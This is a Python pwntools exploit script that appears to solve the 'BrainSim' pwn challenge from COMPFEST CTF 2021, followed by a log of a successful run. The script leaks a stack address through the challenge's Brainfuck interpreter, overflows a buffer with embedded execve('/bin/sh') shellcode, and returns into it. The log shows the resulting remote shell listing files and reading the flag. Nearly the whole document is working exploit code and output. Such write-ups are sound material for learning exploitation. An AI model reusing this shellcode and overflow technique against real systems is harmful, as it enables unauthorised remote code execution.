from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './BrainSim'
elf  = ELF(BINARY)

shellcode = '\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x8d\x42\x3b\x0f\x05'

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "103.152.242.242"
  PORT = 29461
  s = remote(HOST, PORT)
  REMOTE = True
else:
  s = process(BINARY)
  libc = elf.libc
  REMOTE = False

def Interpret_code(code):
  s.sendlineafter("Input : ", "1")
  s.sendlineafter("Code : ", code)

def Make_string(s0):
  s1 = ""
  for i in range(len(s0)):
    s1 += s0[i] + s0[i]
  return s1

if REMOTE:
  # stack leak
  Interpret_code(".,[>.,]")
  s.sendline("A"*0x810+"\x00"*2)

  s.recvuntil("Output: " + "\x00"*0x800)
  s.recv(8)
  stack_leak = u64(s.recv(8))
  print "stack_leak =", hex(stack_leak)

  Interpret_code(",[>,]")
  buf  = shellcode
  buf += "A"*(0x800 - len(buf))
  buf += "B"*0x18
  buf += p64(stack_leak)
  s.sendline(buf)

else:
  # stack leak
  Interpret_code(".,[>.,]")
  s.sendline("AA"*0x810+"\x00")

  s.recvuntil("Output: " + "\x00"*0x800)
  s.recv(8)
  stack_leak = u64(s.recv(8))
  print "stack_leak =", hex(stack_leak)

  Interpret_code(",[>,]")
  buf  = Make_string(shellcode)
  buf += "AA"*(0x800 - len(buf)/2)
  buf += "BB"*0x18
  buf += Make_string(p64(stack_leak)[:-1]) + "\n"
  s.sendline(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/COMPFEST_CTF_2021/Pwn_BrainSim/brainsim-master-public/public$ python solve.py r
[*] '/home/mito/CTF/COMPFEST_CTF_2021/Pwn_BrainSim/brainsim-master-public/public/BrainSim'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to 103.152.242.242 on port 29461: Done
stack_leak = 0x7ffd02a75070
[*] Switching to interactive mode

Output: $ ls -l
total 48
-rwxr-xr-x 1 0 0 21064 Sep 12 04:47 BrainSim
-rw-r--r-- 1 0 0  2261 Sep 12 04:47 BrainSim.c
drwxr-xr-x 2 0 0  4096 Sep 12 04:40 bin
drwxr-xr-x 2 0 0  4096 Sep 12 04:40 dev
-r--r--r-- 1 0 0    56 Sep 12 04:47 flag.txt
lrwxrwxrwx 1 0 0     7 Sep 12 04:40 lib -> usr/lib
lrwxrwxrwx 1 0 0     9 Sep 12 04:40 lib32 -> usr/lib32
lrwxrwxrwx 1 0 0     9 Sep 12 04:40 lib64 -> usr/lib64
lrwxrwxrwx 1 0 0    10 Sep 12 04:40 libx32 -> usr/libx32
-rwxr-xr-x 1 0 0   338 Sep 12 04:47 run.sh
drwxr-xr-x 6 0 0  4096 Sep 12 04:40 usr
$ cat flag.txt
COMPFEST13{570PPPP_I7___937_0U7_0f_my_H34d___b6fc1236d6}
'''

